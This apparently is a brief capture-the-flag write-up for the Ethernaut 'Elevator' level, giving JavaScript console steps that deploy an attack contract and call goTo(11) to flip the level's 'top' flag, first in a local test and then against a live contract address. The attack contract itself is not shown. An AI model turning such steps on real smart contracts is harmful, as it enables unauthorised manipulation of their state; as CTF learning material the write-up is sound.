# Elevator

[Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)


## Test Attack

```JS
el = await Elevator.deployed()
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```

<BR />

## Live Attack

```JS
el = await Elevator.at("0xaef17A18bd4ec8abCE38EeE6B054242a69482D11")
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```
